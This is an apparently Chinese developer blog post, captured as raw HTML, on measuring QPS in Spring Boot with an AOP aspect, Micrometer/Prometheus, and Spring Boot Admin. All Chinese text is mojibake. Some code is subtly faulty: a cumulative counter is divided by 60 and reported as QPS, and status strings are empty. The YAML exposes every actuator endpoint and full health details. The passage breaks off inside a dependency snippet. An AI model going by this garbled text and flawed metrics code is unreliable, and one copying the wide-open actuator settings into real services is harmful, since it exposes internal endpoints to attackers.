                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>å¤§å®¶å¥½ï¼Œæˆ‘æ˜¯å°æ‚Ÿã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ä»€ä¹ˆæ˜¯QPSï¼Ÿâ€”â€” ç³»ç»Ÿçš„"å¿ƒè·³é¢‘ç‡" ğŸ’—</h2>
<p>æƒ³è±¡ä¸€ä¸‹ä½ çš„ç³»ç»Ÿå°±åƒä¸€ä¸ªå¿™ç¢Œçš„å¤–å–å°å“¥ï¼ŒQPSï¼ˆQuery Per Secondï¼‰å°±æ˜¯ä»–æ¯ç§’èƒ½é€å¤šå°‘ä»½å¤–å–ï¼å¦‚æœå°å“¥æ¯ç§’åªèƒ½é€1å•ï¼Œé‚£ä¼°è®¡é¡¾å®¢æ—©å°±é¥¿æ™•åœ¨å•æ‰€äº†ï¼›è¦æ˜¯æ¯ç§’èƒ½é€100å•ï¼Œé‚£ä»–ç»å¯¹æ˜¯"é—ªç”µä¾ "é™„ä½“ï¼</p>
<p>æ­£å¸¸ç³»ç»Ÿçš„QPSå°±åƒäººçš„å¿ƒè·³ï¼š</p>
<ul>
<li><strong>60-100 QPS</strong>ï¼šå¥åº·å°ä¼™å­ï¼Œå¿ƒè·³å¹³ç¨³</li>
<li><strong>100-1000 QPS</strong>ï¼šå¥èº«è¾¾äººï¼Œæœ‰ç‚¹å°æ¿€åŠ¨</li>
<li><strong>1000+ QPS</strong>ï¼šè·‘é©¬æ‹‰æ¾å‘¢ï¼å¿«å–˜å£æ°”ï¼</li>
<li><strong>10000+ QPS</strong>ï¼šè¿™è´§æ˜¯æ‰“äº†é¸¡è¡€å§ï¼Ÿ</li>
</ul>
<h2 data-id="heading-1">äºŒã€æ–¹æ¡ˆå¤§æ¯”æ‹¼â€”â€”ç»™ç³»ç»Ÿè£…ä¸Š"æ™ºèƒ½æ‰‹ç¯"</h2>
<h3 data-id="heading-2">æ–¹æ¡ˆ1ï¼šç®€æ˜“ç‰ˆæ‰‹ç¯ï¼ˆAOPæ‹¦æˆªå™¨ï¼‰</h3>
<p>é€‚åˆå°é¡¹ç›®ï¼Œå°±åƒç»™ç³»ç»Ÿæˆ´ä¸ªæ‰‹ç¯</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-meta">@Slf4j</span>
<span class="hljs-meta">@Aspect</span>
<span class="hljs-meta">@Component</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QpsMonitorAspect</span> {
    
    <span class="hljs-comment">// ç”¨ConcurrentHashMapå­˜è®¡æ•°å™¨ï¼Œçº¿ç¨‹å®‰å…¨ï¼</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> ConcurrentHashMap&lt;String, AtomicLong&gt; counterMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConcurrentHashMap</span>&lt;&gt;();
    <span class="hljs-keyword">private</span> <span class="hljs-type">ScheduledExecutorService</span> <span class="hljs-variable">scheduler</span> <span class="hljs-operator">=</span> Executors.newScheduledThreadPool(<span class="hljs-number">1</span>);
    
    <span class="hljs-meta">@PostConstruct</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> {
        log.info(<span class="hljs-string">"QPSç›‘æ§é¾Ÿé¾Ÿå·²å¯åŠ¨ï¼Œå¼€å§‹æ…¢æ…¢çˆ¬..."</span>);
        <span class="hljs-comment">// æ¯ç§’ç»Ÿè®¡ä¸€æ¬¡ï¼Œåƒä¹Œé¾Ÿä¸€æ ·ç¨³å®š</span>
        scheduler.scheduleAtFixedRate(<span class="hljs-built_in">this</span>::printQps, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, TimeUnit.SECONDS);
    }
    
    <span class="hljs-meta">@Around("@annotation(org.springframework.web.bind.annotation.GetMapping) || " +
            "@annotation(org.springframework.web.bind.annotation.PostMapping)")</span>
    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">countQps</span><span class="hljs-params">(ProceedingJoinPoint joinPoint)</span> <span class="hljs-keyword">throws</span> Throwable {
        <span class="hljs-type">String</span> <span class="hljs-variable">methodName</span> <span class="hljs-operator">=</span> joinPoint.getSignature().toShortString();
        
        <span class="hljs-comment">// è®¡æ•°å™¨è‡ªå¢ï¼Œåƒå°æ¾é¼ å›¤æ¾æœä¸€æ ·ç§¯æ</span>
        counterMap.computeIfAbsent(methodName, k -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">AtomicLong</span>(<span class="hljs-number">0</span>))
                 .incrementAndGet();
        
        <span class="hljs-type">long</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> System.currentTimeMillis();
        <span class="hljs-keyword">try</span> {
            <span class="hljs-keyword">return</span> joinPoint.proceed();
        } <span class="hljs-keyword">finally</span> {
            <span class="hljs-type">long</span> <span class="hljs-variable">cost</span> <span class="hljs-operator">=</span> System.currentTimeMillis() - start;
            <span class="hljs-comment">// é¡ºä¾¿è®°å½•ä¸€ä¸‹å“åº”æ—¶é—´ï¼Œçœ‹çœ‹ç³»ç»Ÿæ˜¯ä¸æ˜¯"è€äº†è…¿è„šæ…¢"</span>
            <span class="hljs-keyword">if</span> (cost &gt; <span class="hljs-number">1000</span>) {
                log.warn(<span class="hljs-string">"æ–¹æ³• {} æ‰§è¡Œäº† {}msï¼Œæ¯”èœ—ç‰›è¿˜æ…¢ï¼"</span>, methodName, cost);
            }
        }
    }
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">printQps</span><span class="hljs-params">()</span> {
        <span class="hljs-keyword">if</span> (counterMap.isEmpty()) {
            log.info(<span class="hljs-string">"ç³»ç»Ÿåœ¨ç¡å¤§è§‰ï¼Œæ²¡æœ‰è¯·æ±‚..."</span>);
            <span class="hljs-keyword">return</span>;
        }
        
        <span class="hljs-type">StringBuilder</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>(<span class="hljs-string">"\n========== QPSæŠ¥å‘Š ==========\n"</span>);
        counterMap.forEach((method, counter) -&gt; {
            <span class="hljs-type">long</span> <span class="hljs-variable">qps</span> <span class="hljs-operator">=</span> counter.getAndSet(<span class="hljs-number">0</span>); <span class="hljs-comment">// é‡ç½®è®¡æ•°å™¨</span>
            <span class="hljs-type">String</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> <span class="hljs-string">""</span>;
            <span class="hljs-keyword">if</span> (qps &gt; <span class="hljs-number">1000</span>) status = <span class="hljs-string">""</span>;
            <span class="hljs-keyword">if</span> (qps &gt; <span class="hljs-number">5000</span>) status = <span class="hljs-string">""</span>;
            
            sb.append(String.format(<span class="hljs-string">"%s %-40s : %d QPS%n"</span>, 
                    status, method, qps));
        });
        sb.append(<span class="hljs-string">"================================"</span>);
        log.info(sb.toString());
    }
}
</code></pre>
<h3 data-id="heading-3">æ–¹æ¡ˆ2ï¼šä¸“ä¸šç‰ˆä½“æ£€ä»ªï¼ˆMicrometer + Prometheusï¼‰</h3>
<p>é€‚åˆå¤§é¡¹ç›®ï¼Œå°±åƒç»™ç³»ç»Ÿåšå…¨é¢ä½“æ£€</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-meta">@Configuration</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MetricsConfig</span> {
    
    <span class="hljs-meta">@Bean</span>
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">MeterRegistryCustomizer</span>&lt;<span class="hljs-title class_">MeterRegistry</span>&gt; <span class="hljs-title function_">metricsCommonTags</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">return</span> registry -&gt; {
            registry.<span class="hljs-title function_">config</span>().<span class="hljs-title function_">commonTags</span>(<span class="hljs-string">"application"</span>, <span class="hljs-string">"my-awesome-app"</span>);
            log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ç³»ç»Ÿä½“æ£€ä¸­å¿ƒå¼€ä¸šå•¦ï¼æ¬¢è¿éšæ—¶æ¥æ£€æŸ¥èº«ä½“~"</span>);
        };
    }
}

<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderService</span> {
    
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Counter</span> orderCounter;
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">Timer</span> orderTimer;
    <span class="hljs-keyword">private</span> final <span class="hljs-title class_">MeterRegistry</span> meterRegistry;
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">OrderService</span>(<span class="hljs-title class_">MeterRegistry</span> meterRegistry) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">meterRegistry</span> = meterRegistry;
        
        <span class="hljs-comment">// åˆ›å»ºè®¢å•è®¡æ•°å™¨ï¼Œåƒæ”¶é“¶æœºä¸€æ ·"å®å®å®"</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">orderCounter</span> = <span class="hljs-title class_">Counter</span>.<span class="hljs-title function_">builder</span>(<span class="hljs-string">"order.count"</span>)
                .<span class="hljs-title function_">description</span>(<span class="hljs-string">"è®¢å•æ•°é‡ç»Ÿè®¡"</span>)
                .<span class="hljs-title function_">tag</span>(<span class="hljs-string">"type"</span>, <span class="hljs-string">"create"</span>)
                .<span class="hljs-title function_">register</span>(meterRegistry);
        
        <span class="hljs-comment">// åˆ›å»ºè®¢å•è€—æ—¶è®¡æ—¶å™¨</span>
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">orderTimer</span> = <span class="hljs-title class_">Timer</span>.<span class="hljs-title function_">builder</span>(<span class="hljs-string">"order.process.time"</span>)
                .<span class="hljs-title function_">description</span>(<span class="hljs-string">"è®¢å•å¤„ç†æ—¶é—´"</span>)
                .<span class="hljs-title function_">register</span>(meterRegistry);
    }
    
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Order</span> <span class="hljs-title function_">createOrder</span>(<span class="hljs-params">OrderDTO dto</span>) {
        <span class="hljs-comment">// è®°å½•æ–¹æ³•æ‰§è¡Œæ—¶é—´</span>
        <span class="hljs-keyword">return</span> orderTimer.<span class="hljs-title function_">record</span>(() -&gt; {
            log.<span class="hljs-title function_">debug</span>(<span class="hljs-string">"æ­£åœ¨æ‰“åŒ…è®¢å•ï¼Œè¯·ç¨å€™..."</span>);
            
            <span class="hljs-comment">// ä¸šåŠ¡é€»è¾‘...</span>
            <span class="hljs-title class_">Order</span> order = <span class="hljs-title function_">doCreateOrder</span>(dto);
            
            <span class="hljs-comment">// è®¢å•åˆ›å»ºæˆåŠŸï¼Œè®¡æ•°å™¨+1</span>
            orderCounter.<span class="hljs-title function_">increment</span>();
            
            <span class="hljs-comment">// åŠ¨æ€QPSç»Ÿè®¡ï¼ˆæœ€è¿‘1åˆ†é’Ÿï¼‰</span>
            double qps = meterRegistry.<span class="hljs-title function_">get</span>(<span class="hljs-string">"order.count"</span>)
                    .<span class="hljs-title function_">counter</span>()
                    .<span class="hljs-title function_">measure</span>()
                    .<span class="hljs-title function_">stream</span>()
                    .<span class="hljs-title function_">findFirst</span>()
                    .<span class="hljs-title function_">map</span>(<span class="hljs-title class_">Measurement</span>::getValue)
                    .<span class="hljs-title function_">orElse</span>(<span class="hljs-number">0.0</span>) / <span class="hljs-number">60.0</span>;
            
            <span class="hljs-keyword">if</span> (qps &gt; <span class="hljs-number">100</span>) {
                log.<span class="hljs-title function_">warn</span>(<span class="hljs-string">"è®¢å•å¤„ç†å¤ªå¿«äº†ï¼å½“å‰QPS: {}/sï¼Œè€ƒè™‘åŠ ç‚¹è¿è´¹ï¼Ÿ"</span>, qps);
            }
            
            <span class="hljs-keyword">return</span> order;
        });
    }
    
    <span class="hljs-comment">// åŠ¨æ€æŸ¥çœ‹QPSçš„API</span>
    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/metrics/qps"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; <span class="hljs-title function_">getRealTimeQps</span>(<span class="hljs-params"/>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Object</span>&gt; metrics = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();
        
        <span class="hljs-comment">// æ”¶é›†æ‰€æœ‰æ¥å£çš„QPS</span>
        meterRegistry.<span class="hljs-title function_">getMeters</span>().<span class="hljs-title function_">forEach</span>(meter -&gt; {
            <span class="hljs-title class_">String</span> meterName = meter.<span class="hljs-title function_">getId</span>().<span class="hljs-title function_">getName</span>();
            <span class="hljs-keyword">if</span> (meterName.<span class="hljs-title function_">contains</span>(<span class="hljs-string">".count"</span>)) {
                double qps = meter.<span class="hljs-title function_">counter</span>().<span class="hljs-title function_">count</span>() / <span class="hljs-number">60.0</span>; <span class="hljs-comment">// è½¬æ¢ä¸ºæ¯ç§’</span>
                metrics.<span class="hljs-title function_">put</span>(meterName, <span class="hljs-title class_">String</span>.<span class="hljs-title function_">format</span>(<span class="hljs-string">"%.2f QPS"</span>, qps));
                
                <span class="hljs-comment">// æ·»åŠ è¡¨æƒ…åŒ…å¢å¼ºå¯è§†åŒ–æ•ˆæœ</span>
                <span class="hljs-title class_">String</span> emoji = <span class="hljs-string">""</span>;
                <span class="hljs-keyword">if</span> (qps &gt; <span class="hljs-number">100</span>) emoji = <span class="hljs-string">""</span>;
                <span class="hljs-keyword">if</span> (qps &gt; <span class="hljs-number">500</span>) emoji = <span class="hljs-string">""</span>;
                metrics.<span class="hljs-title function_">put</span>(meterName + <span class="hljs-string">"_emoji"</span>, emoji);
            }
        });
        
        metrics.<span class="hljs-title function_">put</span>(<span class="hljs-string">"report_time"</span>, <span class="hljs-title class_">LocalDateTime</span>.<span class="hljs-title function_">now</span>());
        metrics.<span class="hljs-title function_">put</span>(<span class="hljs-string">"message"</span>, <span class="hljs-string">"ç³»ç»Ÿå½“å‰çŠ¶æ€è‰¯å¥½ï¼Œåƒå˜›å˜›é¦™ï¼"</span>);
        
        <span class="hljs-keyword">return</span> metrics;
    }
}
</code></pre>
<h3 data-id="heading-4">æ–¹æ¡ˆ3ï¼šè±ªåç‰ˆç›‘æ§å¤§å±ï¼ˆSpring Boot Adminï¼‰</h3>
<p>ç»™è€æ¿çœ‹çš„ï¼Œå¿…é¡»é«˜å¤§ä¸Šï¼</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># application.yml</span>
<span class="hljs-attr">spring:</span>
  <span class="hljs-attr">boot:</span>
    <span class="hljs-attr">admin:</span>
      <span class="hljs-attr">client:</span>
        <span class="hljs-attr">url:</span> <span class="hljs-string">http://localhost:9090</span>  <span class="hljs-comment"># Admin Serveråœ°å€</span>
        <span class="hljs-attr">instance:</span>
          <span class="hljs-attr">name:</span> <span class="hljs-string">"é’é¾™ç³»ç»Ÿ"</span>
          <span class="hljs-attr">metadata:</span>
            <span class="hljs-attr">owner:</span> <span class="hljs-string">"ç å†œå°å¼ "</span>
            <span class="hljs-attr">department:</span> <span class="hljs-string">"çˆ†è‚äº‹ä¸šéƒ¨"</span>

<span class="hljs-attr">management:</span>
  <span class="hljs-attr">endpoints:</span>
    <span class="hljs-attr">web:</span>
      <span class="hljs-attr">exposure:</span>
        <span class="hljs-attr">include:</span> <span class="hljs-string">"*"</span>  <span class="hljs-comment"># æš´éœ²æ‰€æœ‰ç«¯ç‚¹ï¼Œä¸ç©¿"éšèº«è¡£"</span>
  <span class="hljs-attr">metrics:</span>
    <span class="hljs-attr">export:</span>
      <span class="hljs-attr">prometheus:</span>
        <span class="hljs-attr">enabled:</span> <span class="hljs-literal">true</span>
  <span class="hljs-attr">endpoint:</span>
    <span class="hljs-attr">health:</span>
      <span class="hljs-attr">show-details:</span> <span class="hljs-string">ALWAYS</span>
</code></pre>

<pre><code class="hljs language-swift" lang="swift"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">QpsDashboardController</span> {
    
    <span class="hljs-meta">@GetMapping</span>(<span class="hljs-string">"/dashboard/qps"</span>)
    <span class="hljs-keyword">public</span> <span class="hljs-type">String</span> qpsDashboard() {
        <span class="hljs-comment">// æ¨¡æ‹Ÿä»å„ä¸ªæœåŠ¡æ”¶é›†QPSæ•°æ®</span>
        <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Double</span>&gt; serviceQps <span class="hljs-operator">=</span> getClusterQps();
        
        <span class="hljs-comment">// ç”ŸæˆASCIIè‰ºæœ¯æŠ¥è¡¨</span>
        <span class="hljs-type">StringBuilder</span> dashboard <span class="hljs-operator">=</span> new <span class="hljs-type">StringBuilder</span>();
        dashboard.append(<span class="hljs-string">"<span class="hljs-subst">\n</span>"</span>);
        dashboard.append(<span class="hljs-string">"â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—<span class="hljs-subst">\n</span>"</span>);
        dashboard.append(<span class="hljs-string">"â•‘        ç³»ç»ŸQPSç›‘æ§å¤§å±                     â•‘<span class="hljs-subst">\n</span>"</span>);
        dashboard.append(<span class="hljs-string">"â• â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•£<span class="hljs-subst">\n</span>"</span>);
        
        serviceQps.forEach((service, qps) -&gt; {
            <span class="hljs-comment">// ç”Ÿæˆè¿›åº¦æ¡</span>
            int bars <span class="hljs-operator">=</span> (int) <span class="hljs-type">Math</span>.min(qps <span class="hljs-operator">/</span> <span class="hljs-number">10</span>, <span class="hljs-number">50</span>);
            <span class="hljs-type">String</span> progressBar <span class="hljs-operator">=</span> <span class="hljs-string">"â–ˆ"</span>.repeat(bars) <span class="hljs-operator">+</span> 
                               <span class="hljs-string">"â–‘"</span>.repeat(<span class="hljs-number">50</span> <span class="hljs-operator">-</span> bars);
            
            <span class="hljs-type">String</span> status <span class="hljs-operator">=</span> <span class="hljs-string">"æ­£å¸¸"</span>;
            <span class="hljs-keyword">if</span> (qps <span class="hljs-operator">&gt;</span> <span class="hljs-number">500</span>) status <span class="hljs-operator">=</span> <span class="hljs-string">"è­¦å‘Š"</span>;
            <span class="hljs-keyword">if</span> (qps <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>) status <span class="hljs-operator">=</span> <span class="hljs-string">"ç´§æ€¥"</span>;
            
            dashboard.append(<span class="hljs-type">String</span>.format(<span class="hljs-string">"â•‘ %-15s : %-30s â•‘<span class="hljs-subst">\n</span>"</span>, 
                    service, progressBar));
            dashboard.append(<span class="hljs-type">String</span>.format(<span class="hljs-string">"â•‘   %6.1f QPS %-20s        â•‘<span class="hljs-subst">\n</span>"</span>, 
                    qps, status));
        });
        
        dashboard.append(<span class="hljs-string">"â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•<span class="hljs-subst">\n</span>"</span>);
        
        <span class="hljs-comment">// æ·»åŠ ç³»ç»Ÿå¥åº·å»ºè®®</span>
        dashboard.append(<span class="hljs-string">"<span class="hljs-subst">\n</span> ç³»ç»Ÿå»ºè®®ï¼š<span class="hljs-subst">\n</span>"</span>);
        double maxQps <span class="hljs-operator">=</span> serviceQps.values().stream().max(Double::compare).orElse(<span class="hljs-number">0.0</span>);
        <span class="hljs-keyword">if</span> (maxQps <span class="hljs-operator">&lt;</span> <span class="hljs-number">50</span>) {
            dashboard.append(<span class="hljs-string">"   ç³»ç»Ÿæœ‰ç‚¹é—²ï¼Œå¯ä»¥è€ƒè™‘æ¥ç‚¹ç§æ´»~ <span class="hljs-subst">\n</span>"</span>);
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (maxQps <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>) {
            dashboard.append(<span class="hljs-string">"   ç³»ç»Ÿå¿«å†’çƒŸäº†ï¼å¿«åŠ æœºå™¨ï¼<span class="hljs-subst">\n</span>"</span>);
        } <span class="hljs-keyword">else</span> {
            dashboard.append(<span class="hljs-string">"   çŠ¶æ€å®Œç¾ï¼Œç»§ç»­ä¿æŒï¼<span class="hljs-subst">\n</span>"</span>);
        }
        
        <span class="hljs-keyword">return</span> dashboard.toString();
    }
    
    <span class="hljs-comment">// å®šæ—¶æ¨é€QPSè­¦å‘Š</span>
    <span class="hljs-meta">@Scheduled</span>(fixedRate <span class="hljs-operator">=</span> <span class="hljs-number">60000</span>)
    <span class="hljs-keyword">public</span> void checkQpsAlert() {
        <span class="hljs-type">Map</span>&lt;<span class="hljs-type">String</span>, <span class="hljs-type">Double</span>&gt; currentQps <span class="hljs-operator">=</span> getClusterQps();
        
        currentQps.forEach((service, qps) -&gt; {
            <span class="hljs-keyword">if</span> (qps <span class="hljs-operator">&gt;</span> <span class="hljs-number">1000</span>) {
                log.error(<span class="hljs-string">"æ•‘å‘½ï¼{}æœåŠ¡QPSçˆ†è¡¨äº†ï¼š{}ï¼Œå¿«çœ‹çœ‹æ˜¯ä¸æ˜¯è¢«çˆ¬äº†ï¼"</span>, 
                         service, qps);
                <span class="hljs-comment">// è¿™é‡Œå¯ä»¥æ¥å…¥é’‰é’‰/ä¼ä¸šå¾®ä¿¡å‘Šè­¦</span>
                sendAlertToDingTalk(service, qps);
            }
        });
    }
    
    <span class="hljs-keyword">private</span> void sendAlertToDingTalk(<span class="hljs-type">String</span> service, double qps) {
        <span class="hljs-type">String</span> message <span class="hljs-operator">=</span> <span class="hljs-type">String</span>.format(
            <span class="hljs-string">"{<span class="hljs-subst">\"</span>msgtype<span class="hljs-subst">\"</span>: <span class="hljs-subst">\"</span>text<span class="hljs-subst">\"</span>, <span class="hljs-subst">\"</span>text<span class="hljs-subst">\"</span>: {<span class="hljs-subst">\"</span>content<span class="hljs-subst">\"</span>: <span class="hljs-subst">\"</span>%sæœåŠ¡QPSå¼‚å¸¸ï¼š%.1fï¼Œå¿«å»çœ‹çœ‹å§ï¼<span class="hljs-subst">\"</span>}}"</span>,
            service, qps
        );
        <span class="hljs-comment">// è°ƒç”¨é’‰é’‰webhook</span>
        log.warn(<span class="hljs-string">"å·²å‘é€é’‰é’‰å‘Šè­¦ï¼š{}"</span>, message);
    }
}
</code></pre>
<h2 data-id="heading-5">ä¸‰ã€æ–¹æ¡ˆè¯¦ç»†å®æ–½æ­¥éª¤</h2>
<h3 data-id="heading-6">æ–¹æ¡ˆ1å®æ–½æ­¥éª¤ï¼ˆç®€æ˜“ç‰ˆï¼‰ï¼š</h3>
<ol>
<li><strong>æ·»åŠ ä¾èµ–</strong>ï¼šç»™ä½ çš„<code>pom.xml</code>æ¥ç‚¹"ç»´ç”Ÿç´ "</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<ol>
<li><strong>å¯ç”¨AOP</strong>ï¼šåœ¨ä¸»ç±»ä¸Šè´´ä¸ª"åˆ›å¯è´´"</li>
</ol>

<pre><code class="hljs language-less" lang="less"><span class="hljs-variable">@SpringBootApplication</span>
<span class="hljs-variable">@EnableAspectJAutoProxy</span>  <span class="hljs-comment">// å¯ç”¨AOPé­”æ³•</span>
public class Application {
    <span class="hljs-selector-tag">public</span> <span class="hljs-selector-tag">static</span> <span class="hljs-selector-tag">void</span> <span class="hljs-selector-tag">main</span>(String[] args) {
        <span class="hljs-selector-tag">SpringApplication</span><span class="hljs-selector-class">.run</span>(Application.class, args);
        <span class="hljs-selector-tag">System</span><span class="hljs-selector-class">.out</span><span class="hljs-selector-class">.println</span>(<span class="hljs-string">"QPSç›‘æ§å°é¸¡ç ´å£³è€Œå‡ºï¼"</span>);
    }
}
</code></pre>
<ol>
<li><strong>åˆ›å»ºåˆ‡é¢ç±»</strong>ï¼šå¦‚ä¸Šæ–‡çš„<code>QpsMonitorAspect</code></li>
<li><strong>æµ‹è¯•ä¸€ä¸‹</strong>ï¼šç–¯ç‹‚åˆ·æ–°æ¥å£ï¼Œçœ‹çœ‹æ§åˆ¶å°è¾“å‡º</li>
</ol>
<h3 data-id="heading-7">æ–¹æ¡ˆ2å®æ–½æ­¥éª¤ï¼ˆä¸“ä¸šç‰ˆï¼‰ï¼š</h3>
<ol>
<li><strong>æ·»åŠ å…¨å®¶æ¡¶ä¾èµ–</strong>ï¼š</li>
</ol>

<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
